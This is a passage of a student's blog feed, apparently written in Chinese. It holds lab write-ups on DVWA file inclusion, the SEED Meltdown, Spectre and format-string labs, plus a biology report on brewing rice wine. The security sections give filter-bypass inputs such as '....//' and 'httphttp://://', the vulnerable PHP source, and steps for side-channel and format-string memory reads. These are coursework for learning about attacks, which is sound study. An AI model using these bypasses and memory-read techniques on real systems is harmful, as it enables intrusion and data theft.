    <content type="html"><![CDATA[<h2 id="DVWA——File-inclusion漏洞"><a href="#DVWA——File-inclusion漏洞" class="headerlink" title="DVWA——File inclusion漏洞"></a>DVWA——File inclusion漏洞</h2><p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><blockquote><p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为“包含”（include）。</p><p>通常，所包含的文件是“写死”的。但是如果可在执行中，动态确定所要包含的文件，将显著增加灵活性。</p><p>然而灵活性增加的同时，也带来安全隐患</p></blockquote><p><strong>漏洞条件</strong></p><p>参考blog：<a href="https://blog.csdn.net/weixin_58660073/article/details/117867429" target="_blank" rel="noopener">文件包含漏洞</a></p><p>当服务器php配置中开启allow_ url include时，可以通过php的某些特性函数(include(),require(),include once()和 require once())利用url去动态包含文件<strong>。如果没有对文件来源进行严格审查，就会导致加载恶意文件。</strong><br>   文件包含漏洞分为<strong>本地文件包含漏洞</strong>和<strong>远程文件包含漏洞</strong>,远程文件包含漏洞是因为开启了php配置中的allow urlr fopen选项，该选项开启以后，服务器允许包含一个远程文件。<br>   需要说明的一点是，包含文件时，不管文件后缀是不是php,都会尝试当做php文件执行，如果内容是php,会正常执行并打印结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 include:包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php.文件继续执行。require:跟include不同的是，当产生错误的时候，include 下面继续运行而require 停止运行了。</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>首先在自己的服务器(windows server)上搭建xampp，(apache+mysql)，并在相应目录下安装</p><p>DVWA的项目，成功的可以访问到DVWA环境。对于在file inclusion中提示的 <code>allow_url_include：</code>已禁用 的问题应该在本地对于的php代码中将其<code>php.ini</code> 中相应的权限开启即可</p><h3 id="low-level"><a href="#low-level" class="headerlink" title="low level"></a>low level</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// The page we wish to display</span>$file = $_GET[ <span class="hljs-string">'page'</span> ];<span class="hljs-meta">?&gt;</span></code></pre><p>通过源码可以看到文件包含<strong>是在url通过GET传参的方式获取文件</strong>,经过测试发现可以直接获取服务器文件路径：</p><p><img src="/2021/09/15/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E4%B8%80/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>接下来，尝试进行包含本地文件</p><p><img src="/2021/09/15/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E4%B8%80/2.PNG" srcset="/img/loading.gif" alt="2"></p><p><strong>无论文件后缀名是什么，只要文件内容为php脚本都会正确解析并且执行</strong></p><h3 id="Mid-level"><a href="#Mid-level" class="headerlink" title="Mid level"></a>Mid level</h3><p>继续来看中级的源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// The page we wish to display</span>$file = $_GET[ <span class="hljs-string">'page'</span> ];<span class="hljs-comment">// Input validation</span>$file = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span> ), <span class="hljs-string">""</span>, $file );$file = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">"../"</span>, <span class="hljs-string">"..\""</span> ), <span class="hljs-string">""</span>, $file );<span class="hljs-meta">?&gt;</span></code></pre><p>会发现对于输入进行来检查并且会进行相应替换，我们可以采用double input来进行攻击。本地文件包含：….//….//绕过过滤，远程文件包含：httphttp://://</p><h3 id="High-level"><a href="#High-level" class="headerlink" title="High level"></a>High level</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// The page we wish to display</span>$file = $_GET[ <span class="hljs-string">'page'</span> ];<span class="hljs-comment">// Input validation</span><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">"file*"</span>, $file ) &amp;&amp; $file != <span class="hljs-string">"include.php"</span> ) &#123;    <span class="hljs-comment">// This isn't the page we want!</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;    <span class="hljs-keyword">exit</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>分析源代码可知道将 <code>str_replace</code>替换为 <code>fnmatch</code> ，保证服务器只能够通过 <code>file</code>协议来获取文件。</p><p>所以这里并不能通过http协议来进行访问远程文件，通过file可以看到对应的文件内容</p><p><img src="/2021/09/15/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E4%B8%80/3.PNG" srcset="/img/loading.gif" alt="3"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DVWA——File-inclusion漏洞&quot;&gt;&lt;a href=&quot;#DVWA——File-inclusion漏洞&quot; class=&quot;headerlink&quot; title=&quot;DVWA——File inclusion漏洞&quot;&gt;&lt;/a&gt;DVWA——File inclusion</summary>
      
    
    
    
    
    <category term="安全攻防综合实验" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>meltdown lab</title>
    <link href="http://yoursite.com/2021/05/27/meltdown-lab/"/>
    <id>http://yoursite.com/2021/05/27/meltdown-lab/</id>
    <published>2021-05-27T02:55:58.000Z</published>
    <updated>2021-06-13T03:31:41.830Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Meltdown"><a href="#Meltdown" class="headerlink" title="Meltdown"></a>Meltdown</h2><h3 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h3><p>多次运行 CacheTime 程序，访问 Cache 的时间明显短于访问内存的时间，选择80作为阈值</p><p><img src="/2021/05/27/meltdown-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h3><p><img src="/2021/05/27/meltdown-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="Tasks-3-5-Preparation-for-the-Meltdown-Attack"><a href="#Tasks-3-5-Preparation-for-the-Meltdown-Attack" class="headerlink" title="Tasks 3-5: Preparation for the Meltdown Attack"></a>Tasks 3-5: Preparation for the Meltdown Attack</h3><p>meltdown攻击需要具有两个条件：</p><ol><li>需要知道secret的地址</li><li>secret需要存在cache当中</li></ol><p>运行命令之后能够得到相应的地址</p><p><img src="/2021/05/27/meltdown-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><h3 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h3><p><img src="/2021/05/27/meltdown-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>第二行并不会被执行，发生段错误，这是由于用户级程序无权访问内核空间数据</p><h3 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h3><p><img src="/2021/05/27/meltdown-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>运行 ExceptionHandling 程序，没有报错，说明执行了我们定义的异常处理函数</p><h3 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h3><p>逻辑过程，首先先将cache进行flush，然后在访问内存的时候触发一个中断异常，然后根据处理函数进行处理。之后回滚到之前的checkpoint，进入else分支当中。然后之后通过reload来查看对应缓存的条目</p><p>说明在等待询问数据是否合法的时候，secret已经在cache当中</p><p><img src="/2021/05/27/meltdown-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><h3 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h3><p>用一个数组记录缓存在 cache 中的数据下标，如果遍历结束后该数组有且只有一个下标值，那么就是 secret 值，但是运行多次，发现没有成功</p><p><img src="/2021/05/27/meltdown-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><h3 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h3><p>先将内核数据缓存到 cache 后，然后进行攻击，也没有成功</p><p><img src="/2021/05/27/meltdown-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h3><p>结果如下，成功率比较低（循环 400 次），而当我们增减循环次数的时候，成功率会稍微提高一点，降低的时候成功率也是很低的</p><p><img src="/2021/05/27/meltdown-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><h3 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h3><p>运行 MeltdownAttack，发现secret 值为 83（S），之后为了打印出所有的字符，我们只需要让他每次攻击地址的步长增加1B就好，最后会得到结果SEEDLabs</p><p><img src="/2021/05/27/meltdown-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Meltdown&quot;&gt;&lt;a href=&quot;#Meltdown&quot; class=&quot;headerlink&quot; title=&quot;Meltdown&quot;&gt;&lt;/a&gt;Meltdown&lt;/h2&gt;&lt;h3 id=&quot;Task-1-Reading-from-Cache-versus-from-Mem</summary>
      
    
    
    
    
    <category term="Software Security" scheme="http://yoursite.com/tags/Software-Security/"/>
    
  </entry>
  
  <entry>
    <title>spectre_attack lab</title>
    <link href="http://yoursite.com/2021/05/27/spectre-attack-lab/"/>
    <id>http://yoursite.com/2021/05/27/spectre-attack-lab/</id>
    <published>2021-05-27T02:55:43.000Z</published>
    <updated>2021-05-27T04:57:07.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spectre-attack-lab"><a href="#Spectre-attack-lab" class="headerlink" title="Spectre attack lab"></a>Spectre attack lab</h2><p>CPU的漏洞使得恶意程序能够破环进程间的保护机制（硬件）和进程内的保护机制（软件），从而使得而已程序徐能够从不允许访问的区域读取数据</p><h3 id="task-1-amp-2：Side-Channel-Attack-via-CPU-Cache"><a href="#task-1-amp-2：Side-Channel-Attack-via-CPU-Cache" class="headerlink" title="task 1&amp;2：Side Channel Attack via CPU Cache"></a>task 1&amp;2：Side Channel Attack via CPU Cache</h3><p>使用CPU缓存来作为侧信道从而窃取信息</p><p><img src="/2021/05/27/spectre-attack-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>多次运行CacheTime，发现访问缓存的时间明显短于访问内存的时间，选择阈值为100</p><p><img src="/2021/05/27/spectre-attack-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>task2的原理就是，当一个秘密数据被访问的时候，它的缓存中应该有记录，那么之后进行重新加载数组的时候就可以得知</p><p><img src="/2021/05/27/spectre-attack-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><p><strong>这里的数组空间还是有疑问</strong></p><p><img src="/2021/05/27/spectre-attack-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><h3 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task 3: Out-of-Order Execution and Branch Prediction"></a>Task 3: Out-of-Order Execution and Branch Prediction</h3><p>了解CPU当中的无需执行</p><blockquote><p>无序执行是一种优化技术，它允许CPU最大化其所有执行单元的利用率。CPU不是严格按顺序处理指令，而是在所有所需资源可用时立即并行执行指令。当当前操作的执行单元被占用时，其他执行单元可以向前运行。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><blockquote><p>如果这种执行不应该发生，它们会消除无序执行对寄存器和内存的影响，因此执行不会导致任何可见的效果。然而，他们忘记了一件事，对CPU缓存的影响。在无序执行过程中，引用的内存被提取到寄存器中，并且也存储在缓存中。如果必须丢弃无序执行的结果，则还应丢弃由执行引起的缓存。不幸的是，这不是大多数CPU的情况。</p></blockquote><p>程序先清除cache缓存，之后if来进行分支预测。当落到true的时候，通过reload来查看cache当中的条目</p><p><img src="/2021/05/27/spectre-attack-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到此时的secret被加载到了cache当中，说明这时候if分支会执行后面的语句</p><p>注释掉代码之后再次执行，会发现成功率很低，分析原因：</p><p>当注释掉之后，没有对clflush来清除size的缓存，此时victim当中的判断语句能够很快的从cache当中读取到size的值，也就很快能够确定应该执行哪个分支。所以，如果分支预测错误并且读取到的数据还没有加载到cache当中，此时攻击就会失败</p><p><img src="/2021/05/27/spectre-attack-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>改变victim参数为i + 20，发现成功率也是非常低的，这是由于在训练过程中总是会false，所以在之后选择的时候会选择false分支，也就不执行后续语句</p><p><img src="/2021/05/27/spectre-attack-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-4-The-Spectre-Attack"><a href="#Task-4-The-Spectre-Attack" class="headerlink" title="Task 4: The Spectre Attack"></a>Task 4: The Spectre Attack</h3><blockquote><p>如果机密数据在另一个进程中，则硬件级别的进程隔离可以防止进程从另一个进程窃取数据。如果数据处于同一进程中，则通常通过软件（如沙盒机制）进行保护。幽灵攻击可以针对这两种类型的秘密发起。</p></blockquote><blockquote><p>当在浏览器中打开来自不同服务器的网页时，它们通常是在同一个过程中打开的。浏览器内部实现的沙盒将为这些页面提供一个隔离的环境，因此一个页面将无法访问另一个页面的数据。大多数软件保护依赖于条件检查来决定是否应该授予访问权限。通过幽灵攻击，即使条件检查失败，我们也可以让CPU执行（无序的）受保护的代码分支，基本上破坏了访问检查。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/05/27/spectre-attack-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p><h3 id="Task-5-Improve-the-Attack-Accuracy"><a href="#Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="Task 5: Improve the Attack Accuracy"></a>Task 5: Improve the Attack Accuracy</h3><blockquote><p>可以观察到结果确实有一些噪声，并且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，希望在以后某个时候使用，或者阈值不是很准确。缓存中的噪声会影响我们的攻击结果。我们需要执行多次攻击；我们可以使用以下代码来自动执行任务，而不是手动执行。</p></blockquote><p>编译运行SpectreAttackImproved，发现每次打印secret都是0</p><p>这是由于在调用restrictedAccess后，会根据返回结果访问相应的数据。而由于secret 存储在 buffer 外，所以 restrictedAccess 函数每次都会返回 0，所以每次都会访问 0 对应的数据， 使得 0 的 hit 次数最</p><p>修改代码，在查找分数最高的数据时，不包括 0</p><p><img src="/2021/05/27/spectre-attack-lab/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/27/spectre-attack-lab/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>同时，修改unsleep（增大休眠时间）成功率会增加</p><h3 id="Task-6-Steal-the-Entire-Secret-String"><a href="#Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="Task 6: Steal the Entire Secret String"></a>Task 6: Steal the Entire Secret String</h3><p>修改 main 函数，每次将 secret 指针移动 1B，依次打印出所有字节</p><p><img src="/2021/05/27/spectre-attack-lab/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/05/27/spectre-attack-lab/13.PNG" srcset="/img/loading.gif" alt="13"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Spectre-attack-lab&quot;&gt;&lt;a href=&quot;#Spectre-attack-lab&quot; class=&quot;headerlink&quot; title=&quot;Spectre attack lab&quot;&gt;&lt;/a&gt;Spectre attack lab&lt;/h2&gt;&lt;p&gt;CPU的漏洞</summary>
      
    
    
    
    
    <category term="Software Security" scheme="http://yoursite.com/tags/Software-Security/"/>
    
  </entry>
  
  <entry>
    <title>生物技术实验报告</title>
    <link href="http://yoursite.com/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://yoursite.com/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</id>
    <published>2021-05-25T11:34:46.000Z</published>
    <updated>2021-05-26T12:40:37.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="酒酿制作及微生物观察"><a href="#酒酿制作及微生物观察" class="headerlink" title="酒酿制作及微生物观察"></a>酒酿制作及微生物观察</h2><p>[TOC]</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>了解酒酿的制作过程以及原理</li><li>分离并观察<strong>酒曲</strong>当中的微生物</li><li>分离并观察<strong>酒酿</strong>当中的微生物</li></ul><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>甜酒曲是主要的发酵制剂。甜酒曲是糖化菌及酵母制剂，其所含的微生物主要有根霉、毛霉及少量酵母。</p><p>糯米的主要成分是淀粉（多糖的一种），尤其以支链淀粉为主。撒上酒曲后，首先根霉菌和酵母菌开始繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>随后，葡萄糖在无氧条件下在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳</p><h3 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h3><ul><li>糯米100g、甜酒曲1包。</li><li>2块YPD培养基平板、1个玻璃三角瓶（注：在实验过程中，由于玻璃三角瓶瓶口过细不易讲酒酿放入，将一部分酒酿放入了自备的碗中培养）</li><li>无菌棉签（或牙签）、保鲜膜等</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h5 id="制备酒酿"><a href="#制备酒酿" class="headerlink" title="制备酒酿"></a>制备酒酿</h5><ol><li><p>首先先将糯米用清水淘洗干净，直到淘米水清澈不浑浊为止，然后我选择用干净的小碗盛放糯米并且用水浸泡了6个小时，此时糯米能够用手轻易碾碎。然后在碗内放一个纱布，加入少量的水</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.jpg" srcset="/img/loading.gif" alt="1"></p><p> 然后将糯米放在微波炉当中进行加热，先中火4min，然后焖5分钟之后再用中火加热5-7min。此时糯米已经完全熟透，无夹生</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2.jpg" srcset="/img/loading.gif" alt="2"></p><p> 待糯米降温到35摄氏度的时候加入少量的水并且撒酒曲，注意此时酒曲应尽量均匀，用量大概是2kg糯米对应8g的酒曲，所以我大概是用了0.4g</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.jpg" srcset="/img/loading.gif" alt="3"></p></li><li><p>用勺子轻轻压平并且用筷子再中间挖出一个小窝来方便观察酒酿的产生情况，之后在表面再撒一些酒曲</p></li><li><p>用保鲜膜覆盖容器，放在大概30摄氏度的环境当中，我将容器放在被子当中来保温</p></li><li><p>发酵大概48小时之后，此时掀开保鲜膜，已经能够闻到较为明显的酒香味和甜味，开始进行后续的微生物培养</p></li></ol><h5 id="微生物培养"><a href="#微生物培养" class="headerlink" title="微生物培养"></a>微生物培养</h5><h6 id="酒曲当中的微生物"><a href="#酒曲当中的微生物" class="headerlink" title="酒曲当中的微生物"></a>酒曲当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒曲</strong>划线YPD平板1块，倒置培养皿培养两到三天</p><h6 id="酒酿当中的微生物"><a href="#酒酿当中的微生物" class="headerlink" title="酒酿当中的微生物"></a>酒酿当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒酿</strong>划线YPD平板1块，倒置培养皿培养两到三天<strong>（在这里由于时间不足，明显我的培养时间不够，大概是1天左右，所以菌落的生长情况并不好）</strong></p><h5 id="观察微生物"><a href="#观察微生物" class="headerlink" title="观察微生物"></a>观察微生物</h5><p> 在这一步当中按照老师的观察指导，用载玻片、盖玻片，显微镜来进行观察根霉菌和酵母菌</p><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><ol><li><p>酒酿观察：产出的酒酿从颜色上来看稍微显黄，具有较浓的酒香味和甜味，但是品尝后发现会有淡淡的酸味产生</p></li><li><p>微生物观察：</p><p> <strong>根霉菌</strong>：观察到丝状菌丝以及黑点状的菌体，同时，再培养皿当中，具有一些肉眼可以观察到的黑点，思考后认为是根霉菌在进行孢子繁殖时产生的孢子</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.jpg" srcset="/img/loading.gif" alt="4"></p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.jpg" srcset="/img/loading.gif" alt="5"></p></li></ol><p><strong>酵母菌</strong>：酵母菌整体呈现出无色透明的椭圆状，下面图片当中有一张是在拍摄当中手机变焦所以形状偏大</p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.jpg" srcset="/img/loading.gif" alt="6"></p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.jpg" srcset="/img/loading.gif" alt="7"></p><h3 id="分析讨论"><a href="#分析讨论" class="headerlink" title="分析讨论"></a>分析讨论</h3><ul><li><p>首先，是对于具体的发酵过程的分析：在撒上就去之后，根霉菌和酵母菌开始进行繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>  之后，在无氧条件下葡萄糖在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳：</p><p>  C6H12O6 → 2 C2H5OH + 2 CO2</p><p>  而如果发酵时间过长，则会产生醋酸，这也是<strong>为什么会产生酸味的原因</strong></p><p>  2 C2H5OH + O2 → CH3COOH + H2O</p></li><li><p>思考制作过程中为什么要控制好温度和含氧量，具体会对哪写过程产生影响</p><p>  温度对于发酵过程产生多方面影响。首先，它会影响各种酶的活性从而影响反应速率；两外会改变菌体代谢产物的合成方向，影响微生物的代谢调控机制；另外，还会会对例如溶解度等产生影响。而酵母菌在含氧丰富的条件下进行有氧呼吸，不同含氧量产生的代谢产物也是不同的，从而影响酒酿品质</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;酒酿制作及微生物观察&quot;&gt;&lt;a href=&quot;#酒酿制作及微生物观察&quot; class=&quot;headerlink&quot; title=&quot;酒酿制作及微生物观察&quot;&gt;&lt;/a&gt;酒酿制作及微生物观察&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的</summary>
      
    
    
    
    
    <category term="改变生活的生物技术" scheme="http://yoursite.com/tags/%E6%94%B9%E5%8F%98%E7%94%9F%E6%B4%BB%E7%9A%84%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Format-String lab</title>
    <link href="http://yoursite.com/2021/05/12/Format-String-lab-1/"/>
    <id>http://yoursite.com/2021/05/12/Format-String-lab-1/</id>
    <published>2021-05-12T10:35:14.000Z</published>
    <updated>2021-06-13T03:06:58.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>是通过printf系列的变量来执行恶意代码等</p><blockquote><p>The way how the input data is fed into the printf() function is unsafe, and it leads to a format-string vulnerability</p><p>最终目标是将代码注入到服务器程序的堆栈中，然后触发代码</p></blockquote><h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>针对第一个task，有两个方法：1 是针对于不能读的地方进行读取，2 是针对于不能写的地方进行写</p><p><img src="/2021/05/12/Format-String-lab-1/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>但是运行后发现会return properly，仔细分析后发现是由于%d只是简单的访问栈上面中的参数，并且把参数换成10进制来输出，并不会访问什么不该访问的</p><p>所以，我们通过%s来进行攻击</p><p><img src="/2021/05/12/Format-String-lab-1/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以发现此时没有正确的return</p><h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>在这一题里面，我们想让程序不能正确返回的思路是正确的，读取内存当中不能被读取的内容或者往内存当中不能写的地方写</p><p>printf函数原型</p><p><img src="/2021/05/12/Format-String-lab-1/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><blockquote><p>此任务的目标是让服务器从内存中打印出一些数据（我们将继续使用10.9.0.5）。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一个有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p></blockquote><h4 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h4><p>此时，buffer作为局部变量是放在栈上面的，一共有1500个字节，在这里，我们需要知道在format string和buf起始地址之间的相对偏移量</p><p>首先，我们能够知道bufferr在栈上面的位置是<code>0xffffd660</code></p><p><img src="/2021/05/12/Format-String-lab-1/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>原本想着是通过gdb调试来看到printf里面的return address，后来发现是自己傻了，那么多次调用printf，怎么看。。。</p><p>后来就直接通过调整%x的数量来看了。。。</p><p>当为%数量为64的时候，发现会正好</p><p><img src="/2021/05/12/Format-String-lab-1/5.PNG" srcset="/img/loading.gif" alt="5">)<img src="/2021/05/12/Format-String-lab-1/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>也就是说，buffer起始的字符串会是第64个参数</p><h4 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h4><p>在这里的话，就是需要我们来打印作为全局变量存放在heap当中的secret字符串</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">"A secret message\n"</span>;</code></pre><p>最开始想到的就是%s，然后将format string上面的第一个参数设置为&amp;secret，但是问题怎么进行修改</p><p>之后想到能直接读取第64位的参数，而这个参数正好是buffer的起始位置</p><p>我们根据提示能够得到对应的在heap当中的地址</p><p><img src="/2021/05/12/Format-String-lab-1/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>然后构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，对应字符串内容被打印出来了</p><p><img src="/2021/05/12/Format-String-lab-1/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="复盘-1"><a href="#复盘-1" class="headerlink" title="复盘"></a>复盘</h4><p>这个task当中最开始的目标就是打印出来对应的数据，注意在printf当中打印的规则，首先会将buffer当中的常规的字符打印出来，而遇到对应的占位符的时候，会根据参数来进行解析，以%s为例，当在buffer中遇到的时候，会来解析，比如将第一个参数对应存储位置里面的数据作为地址来进行寻址，然后打印出内存当中对应位置的字符串</p><h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>这个task的目标是修改对应的target的值/一些影响程序执行的值，首先明确target是存放在heap当中的，然后根据提示信息来获取target的位置信息</p><p><img src="/2021/05/12/Format-String-lab-1/10.PNG" srcset="/img/loading.gif" 